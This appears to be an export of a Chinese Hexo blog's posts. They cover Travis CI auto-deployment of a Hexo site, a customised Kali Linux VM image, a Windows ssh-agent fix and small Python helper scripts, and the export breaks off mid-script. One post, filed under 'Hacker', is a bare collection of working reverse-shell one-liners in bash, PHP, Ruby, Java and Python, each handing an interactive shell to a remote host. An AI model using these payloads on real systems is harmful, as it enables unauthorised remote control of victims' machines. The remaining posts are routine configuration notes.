<h3 id="travis-yml的设置"><a href="#travis-yml的设置" class="headerlink" title=".travis.yml的设置"></a>.travis.yml的设置</h3><p>上面的操作完成后，我们开始着手写 <code>.travis.yml</code>了，先提供一个最简单也是网上博客教程里面最多的版本</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span> <span class="comment"># 设置语言</span></span><br><span class="line"><span class="attr">node_js:</span> <span class="string">stable</span> <span class="comment"># 设置相应版本</span></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">npm</span> <span class="string">install</span> <span class="comment"># 安装hexo及插件</span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">clean</span> <span class="comment"># 清除</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">g</span> <span class="comment"># 生成</span></span><br><span class="line"><span class="attr">after_script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">cd</span> <span class="string">./public</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">init</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.name</span> <span class="string">"yourname"</span> <span class="comment"># 修改name</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.email</span> <span class="string">"your email"</span> <span class="comment"># 修改email</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">commit</span> <span class="bullet">-m</span> <span class="string">"Travis CI Auto Builder"</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">push</span> <span class="bullet">--force</span> <span class="bullet">--quiet</span> <span class="string">"https://$&#123;GH_TOKEN&#125;@$&#123;GH_REF&#125;"</span> <span class="attr">master:master</span> <span class="comment"># GH_TOKEN是在Travis中配置token的名称</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line"><span class="attr">    only:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">hexo</span> <span class="comment">#只监测hexo分支，hexo是我的分支的名称，可根据自己情况设置</span></span><br><span class="line"><span class="attr">env:</span></span><br><span class="line"><span class="attr">    global:</span></span><br><span class="line"><span class="attr">        - GH_REF:</span> <span class="string">github.com/yourname/yourname.github.io.git</span> <span class="comment">#设置GH_REF，注意更改yourname</span></span><br></pre></td></tr></table></figure>
<p>这个是针对 <code>github</code> 仓库的最简版本，不过有个问题，我们从执行的命令中也能看到，就是部署到 <code>master</code> 分支的站点文件每次都会 <code>init</code> 后在提交，所以每次都只有一次 <code>commit</code> 记录，我建议你把下面的看完。</p>
<p>我先把文件给出来：</p>
<p><code>.travis.yml</code> 文件：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"></span><br><span class="line"><span class="attr">node_js:</span> <span class="string">stable</span></span><br><span class="line"></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line"><span class="attr">    apt:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    directories:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">node_modules</span></span><br><span class="line"></span><br><span class="line"><span class="attr">notifications:</span></span><br><span class="line"><span class="attr">    email:</span></span><br><span class="line"><span class="attr">        recipients:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">akkumans@qq.com</span></span><br><span class="line"><span class="attr">        on_success:</span> <span class="string">change</span></span><br><span class="line"><span class="attr">        on_failure:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># turn off the clone of submodules for change the SSH to HTTPS in .gitmodules to avoid the error</span></span><br><span class="line"><span class="attr">git:</span></span><br><span class="line"><span class="attr">  submodules:</span> <span class="literal">false</span></span><br><span class="line">        </span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line">    <span class="comment"># Use sed to replace the SSH URL with the public URL if .gitmodules exists</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">test</span> <span class="bullet">-e</span> <span class="string">".gitmodules"</span> <span class="string">&amp;&amp;</span> <span class="string">sed</span> <span class="bullet">-i</span> <span class="string">'s/git@github.com:/https:\/\/github.com\//'</span> <span class="string">.gitmodules</span></span><br><span class="line">    <span class="comment"># update the submodule in repo by manual</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">submodule</span> <span class="string">update</span> <span class="bullet">--init</span> <span class="bullet">--recursive</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">export</span> <span class="string">TZ='Asia/Shanghai'</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-cli</span> <span class="bullet">-g</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">chmod</span> <span class="string">+x</span> <span class="string">./publish-to-gh-pages.sh</span></span><br><span class="line"></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">npm</span> <span class="string">install</span></span><br><span class="line"></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">g</span></span><br><span class="line"></span><br><span class="line"><span class="attr">after_script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">./publish-to-gh-pages.sh</span></span><br><span class="line"></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line"><span class="attr">    only:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">hexo</span></span><br><span class="line"></span><br><span class="line"><span class="attr">env:</span></span><br><span class="line"><span class="attr">    global:</span></span><br><span class="line">        <span class="comment"># Github Pages</span></span><br><span class="line"><span class="attr">        - GH_REF:</span> <span class="string">github.com/akkuman/akkuman.github.io.git</span></span><br><span class="line">        <span class="comment"># Coding Pages</span></span><br><span class="line"><span class="attr">        - CD_REF:</span> <span class="string">git.coding.net/Akkuman/Akkuman.git</span></span><br></pre></td></tr></table></figure>
<p>我把需要执行的脚本放到了 <code>publish-to-gh-pages.sh</code> 文件。</p>
<p><code>publish-to-gh-pages.sh</code> 文件：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="string">set</span> <span class="bullet">-ev</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get clone master</span></span><br><span class="line"><span class="string">git</span> <span class="string">clone</span> <span class="attr">https://$&#123;GH_REF&#125;</span> <span class="string">.deploy_git</span></span><br><span class="line"><span class="string">cd</span> <span class="string">.deploy_git</span></span><br><span class="line"><span class="string">git</span> <span class="string">checkout</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="string">cd</span> <span class="string">../</span></span><br><span class="line"><span class="string">mv</span> <span class="string">.deploy_git/.git/</span> <span class="string">./public/</span></span><br><span class="line"></span><br><span class="line"><span class="string">cd</span> <span class="string">./public</span></span><br><span class="line"></span><br><span class="line"><span class="string">git</span> <span class="string">config</span> <span class="string">user.name</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="string">git</span> <span class="string">config</span> <span class="string">user.email</span> <span class="string">"akkumans@qq.com"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add commit timestamp</span></span><br><span class="line"><span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line"><span class="string">git</span> <span class="string">commit</span> <span class="bullet">-m</span> <span class="string">"Travis CI Auto Builder at `date +"</span><span class="string">%Y-%m-%d</span> <span class="string">%H:%M"`"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Github Pages</span></span><br><span class="line"><span class="string">git</span> <span class="string">push</span> <span class="bullet">--force</span> <span class="bullet">--quiet</span> <span class="string">"https://$&#123;GITHUB_TOKEN&#125;@$&#123;GH_REF&#125;"</span> <span class="attr">master:master</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Coding Pages</span></span><br><span class="line"><span class="string">git</span> <span class="string">push</span> <span class="bullet">--force</span> <span class="bullet">--quiet</span> <span class="string">"https://Akkuman:$&#123;CODING_TOKEN&#125;@$&#123;CD_REF&#125;"</span> <span class="attr">master:master</span></span><br></pre></td></tr></table></figure>
<p>请把对应的 <code>Akkuman</code> 和 <code>email</code> 还有 <code>username</code> 改成你的配置。</p>
<p>这里我不详解配置，因为这篇文章已经花了很长时间了，如果大家有需要我再详细写。下面我会给出我的仓库地址，如果有不懂可以去看看我仓库下的例子。</p>
<p>说着不详解，但是我还是有点自己踩过的坑需要提点一下，<code>Travis CI</code> 进行 <code>git clone</code> 操作的时候，默认是开启 <code>--recursive</code> 参数的，也就是克隆库的时候会默认初始化子模块。这个操作本来是没问题的，那么我为什么要单独提出来说？</p>
<p>我上面说到了：</p>
<blockquote>
<p>说到子模块，子模块是SSH协议还是HTTPS协议对后面有影响</p>
</blockquote>
<p>问题就是这里了，如果你是用的HTTPS协议，根据 <code>.gitmodules</code> 文件默认初始化子模块的时候是没问题。但是如果使用SSH协议，不管是 <code>clone</code>、<code>push</code>还是其他等等操作， 是要求本机上有私钥，并且仓库那边要有对应的公钥才可以。但是<code>Travis CI</code> 自动部署执行 <code>clone</code> 的时候没有这个公私钥，所以我们只能使用HTTPS协议，但是我使用的是 <code>.gitmodules</code> 文件里面定义的子模块SSH协议呀！我在这里也查了一下，解决方案就是上面的那样。节选出来：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># turn off the clone of submodules for change the SSH to HTTPS in .gitmodules to avoid the error</span></span><br><span class="line"><span class="attr">git:</span></span><br><span class="line"><span class="attr">  submodules:</span> <span class="literal">false</span></span><br><span class="line">        </span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line">    <span class="comment"># Use sed to replace the SSH URL with the public URL if .gitmodules exists</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">test</span> <span class="bullet">-e</span> <span class="string">".gitmodules"</span> <span class="string">&amp;&amp;</span> <span class="string">sed</span> <span class="bullet">-i</span> <span class="string">'s/git@github.com:/https:\/\/github.com\//'</span> <span class="string">.gitmodules</span></span><br><span class="line">    <span class="comment"># update the submodule in repo by manual</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">submodule</span> <span class="string">update</span> <span class="bullet">--init</span> <span class="bullet">--recursive</span></span><br></pre></td></tr></table></figure>
<p>先关闭了 <code>Travis CI</code> 的默认初始化子模块功能，然后后面我们先判断子模块配置文件是否存在（所以我刚才说最省事的就是使用 <code>releases</code> 主题，也就是不含 <code>.git</code> 文件夹的，具体见上面），然后判断子模块配置文件如果存在存在，就使用 <code>sed</code> 把命令把 <code>.gitmodules</code> 子模块配置文件中的SSH协议换成HTTPS协议再执行后面的操作。</p>
<h2 id="开启自动构建之旅"><a href="#开启自动构建之旅" class="headerlink" title="开启自动构建之旅"></a>开启自动构建之旅</h2><p>现在你的博客仓库 <code>akkuman.github.io</code> 文件夹下的 <code>hexo</code> 分支下的东西已经配置好了。</p>
<p>新分支有了，<code>.travis.yml</code> 文件也有了。</p>
<p>你现在可以直接 <code>push</code> 上去：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">":constructin_worker: The introduction of Travis CI"</span></span><br><span class="line">git push origin hexo:hexo</span><br></pre></td></tr></table></figure>
<p>然后打开 <code>Travis CI</code> 网站即可看到你的网站正在构建，如果构建失败，上面也有详细的报错可以帮你分析原因。构建成功后即可看到你焕然一新的网站了。</p>
<p>以后更新 <code>md</code> 就可以用上面的命令 <code>push</code> 到仓库，然后 <code>Travis CI</code> 会自动帮你构建到 <code>master</code> 分支</p>
<h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>为了以后不用打</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin hexo:hexo</span><br></pre></td></tr></table></figure>
<p>而是直接可以使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure>
<p>我们可以设置上游分支，如果是第一次执行 <code>git push origin hexo:hexo</code>，它会提示你使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push --<span class="built_in">set</span>-upstream origin hexo</span><br></pre></td></tr></table></figure>
<p>使用上面的命令即可把本地的 <code>hexo</code> 的上游分支设置为远程仓库的 <code>hexo</code> 分支，以后 <code>push</code> 就可以简化命令为 <code>git push</code> 了。</p>
<p>当然你也可以手动设置上游分支，使用下面的命令把本地的 <code>hexo</code> 的上游分支设置为远程仓库的 <code>hexo</code> 分支：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch --<span class="built_in">set</span>-upstream-to=origin/hexo hexo</span><br></pre></td></tr></table></figure>
<h2 id="我的站点仓库配置示例"><a href="#我的站点仓库配置示例" class="headerlink" title="我的站点仓库配置示例"></a>我的站点仓库配置示例</h2><p>见 <a href="https://github.com/akkuman/akkuman.github.io/tree/hexo" target="_blank" rel="noopener">akkuman/akkuman.github.io</a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://liolok.github.io/Hexo-Travis-CI/" target="_blank" rel="noopener">Hexo + Travis CI 博客管理</a></li>
<li><a href="http://magicse7en.github.io/2016/03/27/travis-ci-auto-deploy-hexo-github/#坑3：-travis-CI自动构建部署之后，博客页面空白，什么也没有" target="_blank" rel="noopener">使用Travis CI自动构建hexo博客</a></li>
<li><a href="http://www.itfanr.cc/2017/08/09/using-travis-ci-automatic-deploy-hexo-blogs/#创建-travis-yml-文件" target="_blank" rel="noopener">使用Travis CI自动部署Hexo博客</a></li>
<li><a href="https://docs.travis-ci.com/user/languages/r/#configuration-options" target="_blank" rel="noopener">Travis CI官方帮助文档</a></li>
<li><a href="https://blog.csdn.net/guotianqing/article/details/82391665" target="_blank" rel="noopener">git中submodule子模块的添加、使用和删除</a></li>
<li><a href="https://blog.chh.tw/posts/git-submodule/" target="_blank" rel="noopener">Git Submodule 用法筆記</a></li>
<li><a href="https://coding.net/help/doc/account/access-token.html" target="_blank" rel="noopener">CODING帮助文档-个人访问令牌</a><blockquote>
<p>提一句上面的git push –force –quiet “<a href="https://Akkuman:${CODING_TOKEN}@${CD_REF}&quot;" target="_blank" rel="noopener">https://Akkuman:${CODING_TOKEN}@${CD_REF}&quot;</a> 网址格式是查询的CODING帮助文档</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux Xfce版美化虚拟机镜像</title>
    <url>/2018/09/04/kali-xfce-vm-amd64-beautify.html</url>
    <content><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>这两天来学校把硬盘基本全部清空了，所以以前的虚拟机就需要重新安装了。</p>
<p><code>Kali</code> 一直用的是 <code>xfce</code> 版本，至于为什么用这个版本，是因为我感觉 <code>gnome3</code> 在虚拟机上表现欠佳。当然，默认的 <code>gnome3</code> 看起来还是不错的，而 <code>xfce</code> 默认的就看起来很寒碜了</p>
<p>默认的 <code>Kali-Xfce</code> 是这个样子的</p>
<a id="more"></a>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382ly1fuxco29z1zj20le0c0146.jpg" alt="原版kali-xfce"></p>
<p>具体过程不表了，如果有人有需要我再发吧，毕竟这次美化过程没有记录，我也懒得再重操一遍了，直接上美化后的截图吧</p>
<h2 id="美化截图"><a href="#美化截图" class="headerlink" title="美化截图"></a>美化截图</h2><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382ly1fuxcov30z4j21hc0u07bd.jpg" alt=""></p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382ly1fuxd0a4t5ej21hc0u0u0x.jpg" alt=""></p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382ly1fuxd11uu4qj21hc0u0b29.jpg" alt=""></p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><p><strong>注意是64位的镜像，需要cpu虚拟化开启支持</strong></p>
<p>直接解压然后导入vmware（version &gt;= 10.X）虚拟机即可，默认账户密码为 <code>root:toor</code></p>
<p>软件源已改为国内的中科大源，不需要自己换</p>
<h3 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h3><p>已更新到 <code>2018-09-04</code> 最新，如果需要更新可以运行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt upadte</span><br><span class="line">apt full-upgrade</span><br></pre></td></tr></table></figure>
<h3 id="顶栏透明"><a href="#顶栏透明" class="headerlink" title="顶栏透明"></a>顶栏透明</h3><p>图片上的顶栏可以改为透明的，在顶栏上右键然后找到 <code>面板首选项 -&gt; 外观 -&gt; alpha</code> 改为 <code>0</code> ，顶栏可透明</p>
<h3 id="更新vmtool"><a href="#更新vmtool" class="headerlink" title="更新vmtool"></a>更新vmtool</h3><p>打开终端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install open-vm-tools-desktop</span><br></pre></td></tr></table></figure>
<p>如果有新版本vmtool会提示更新</p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><h3 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大小: 3649679846 字节</span><br><span class="line">修改时间: 2018年9月4日, 11:18:46</span><br><span class="line">MD5: EDC1BF26205D06EA668F8EA03A05D456</span><br><span class="line">SHA1: 4C2F32BA2DDC53425F34B4316F55C66755A08ACA</span><br><span class="line">CRC32: A51255F0</span><br></pre></td></tr></table></figure>
<h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><ul>
<li><a href="https://pan.baidu.com/s/1Neyff9GpVm08w5A6lesmQQ" target="_blank" rel="noopener">百度网盘 | 密码: jcus</a></li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>win10 1803版本unable to start ssh-agent service, error :1058</title>
    <url>/2018/09/01/win10-1803-unable-to-start-ssh-agent.html</url>
    <content><![CDATA[<p>PowerShell安装了pshazz或者posh-git，但是打开的时候提示 <code>unable to start ssh-agent service, error :1058</code>  </p>
<a id="more"></a>
<p>1803的设置上面可以看到这个版本是默认带了openssh客户端的，我们不需要另外去安装，但是命令行运行 <code>ssh-agent</code> 依然是显示 <code>unable to start ssh-agent service, error :1058</code>  </p>
<p>既然有这个东西，但是服务启动失败，那我们看看本地服务，果然，在本地服务中禁用了，我们改成手动或者自动就能解决这个问题了</p>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>Win10</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell以及端口转发的方法收集</title>
    <url>/2018/08/23/the-code-reverse-shell-and-port-forward.html</url>
    <content><![CDATA[<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.142/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.1.142/80</span><br><span class="line">cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span> </span><br><span class="line"><span class="comment"># or:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r ‘$sock=fsockopen(“<span class="number">192.168</span><span class="number">.1</span><span class="number">.142</span>”,<span class="number">80</span>);exec(“/bin/sh -i &lt;&amp;<span class="number">3</span> &gt;&amp;<span class="number">3</span> <span class="number">2</span>&gt;&amp;<span class="number">3</span>”);’</span><br><span class="line">(Assumes TCP uses file descriptor <span class="number">3.</span> <span class="keyword">If</span> it doesn’t work, <span class="keyword">try</span> <span class="number">4</span>,<span class="number">5</span>, <span class="keyword">or</span> <span class="number">6</span>)</span><br></pre></td></tr></table></figure>
<h2 id="RUBY"><a href="#RUBY" class="headerlink" title="RUBY"></a>RUBY</h2><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e’f=TCPSocket.open(“<span class="number">192.168</span>.<span class="number">1.142</span>”,<span class="number">80</span>).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d <span class="number">2</span>&gt;&amp;%d”,f,f,f)’</span><br></pre></td></tr></table></figure>
<h2 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([“/bin/bash”,”-c”,”exec <span class="number">5</span>&lt;&gt;/dev/tcp/<span class="number">192.168</span>.1.142/<span class="number">80</span>;cat &lt;&amp;<span class="number">5</span> | <span class="keyword">while</span> read line; <span class="keyword">do</span> \$line <span class="number">2</span>&gt;&amp;<span class="number">5</span> &gt;&amp;<span class="number">5</span>; done”] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
<h2 id="PYTHON"><a href="#PYTHON" class="headerlink" title="PYTHON"></a>PYTHON</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c ‘<span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“<span class="number">192.168</span><span class="number">.1</span><span class="number">.142</span>”,<span class="number">80</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([“/bin/sh”,”-i”]);’</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>为纸小墨一键创建md文件</title>
    <url>/2018/08/22/ink-create-md.html</url>
    <content><![CDATA[<p>用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python the.py file_name [article_title] [author_id]</span><br><span class="line"><span class="comment"># []括起来为可选项</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    file_name = <span class="string">''</span></span><br><span class="line">    post_title = <span class="string">''</span></span><br><span class="line">    author = <span class="string">'me'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) == <span class="number">4</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">2</span>])</span><br><span class="line">        author = str(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Usage: \n\t%s file_name [article_title] [author_id]"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./blog/source/%s.md'</span> % file_name, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">'title: %s\n'</span> % post_title)</span><br><span class="line">        f.write(<span class="string">'date: %s\n'</span> % time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime()))</span><br><span class="line">        f.write(<span class="string">'update: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'author: %s\n'</span> % author)</span><br><span class="line">        f.write(<span class="string">'tags: \n'</span>)</span><br><span class="line">        f.write(<span class="string">'- \n'</span>)</span><br><span class="line">        f.write(<span class="string">'categories: \n'</span>)</span><br><span class="line">        f.write(<span class="string">'- \n'</span>)</span><br><span class="line">        f.write(<span class="string">'topic: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'cover: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'draft: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'preview: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'top: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'type: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'hide: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'config: null\n'</span>)</span><br><span class="line">        f.write(<span class="string">'\n\n---\n\n\n\n'</span>)</span><br><span class="line">    print(<span class="string">'Create %s.md Finished'</span> % file_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>一键git push脚本(python版)</title>
    <url>/2018/08/22/git-push-python-script.html</url>
    <content><![CDATA[<p>有时候感觉项目push上去每次都敲那么几个命令挺烦人的，可以用这个脚本来代替手工</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">gitconfig = &#123;</span><br><span class="line">    <span class="string">'cwd'</span>: <span class="string">'./blog/public'</span>,</span><br><span class="line">    <span class="string">'git'</span>: &#123;</span><br><span class="line">        <span class="string">'github'</span>: [<span class="string">'git@github.com:akkuman/akkuman.github.io.git'</span>, <span class="string">'master'</span>],</span><br><span class="line">        <span class="string">'coding'</span>: [<span class="string">'git@git.coding.net:Akkuman/Akkuman.git'</span>, <span class="string">'coding-pages'</span>],</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> gitconfig</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change working directory</span></span><br><span class="line">    os.chdir(gitconfig.get(<span class="string">'cwd'</span>, <span class="string">'.'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if git init</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'.git'</span> <span class="keyword">not</span> <span class="keyword">in</span> os.listdir():</span><br><span class="line">        subprocess.check_call([<span class="string">'git'</span>, <span class="string">'init'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if remote in config, if not, add the remote</span></span><br><span class="line">    git_remotes = subprocess.check_output([<span class="string">'git'</span>, <span class="string">'remote'</span>, <span class="string">'-v'</span>])</span><br><span class="line">    git_remotes_str = bytes.decode(git_remotes).strip()</span><br><span class="line">    git_remotes_list = [line.split()[<span class="number">0</span>] <span class="keyword">for</span> line <span class="keyword">in</span> git_remotes_str.split(<span class="string">'\n'</span>)]</span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> gitconfig[<span class="string">'git'</span>].items():</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> git_remotes_list:</span><br><span class="line">            subprocess.check_call([<span class="string">'git'</span>, <span class="string">'remote'</span>, <span class="string">'add'</span>, k, v[<span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add . &amp; commit with message</span></span><br><span class="line">    subprocess.check_call([<span class="string">'git'</span>, <span class="string">'add'</span>, <span class="string">'.'</span>])</span><br><span class="line">    commit_message = <span class="string">'Site updated: %s'</span> % time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        commit_message = sys.argv[<span class="number">1</span>]</span><br><span class="line">    subprocess.call([<span class="string">'git'</span>, <span class="string">'commit'</span>, <span class="string">'-m'</span>, commit_message])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># push to every remote repo</span></span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> gitconfig[<span 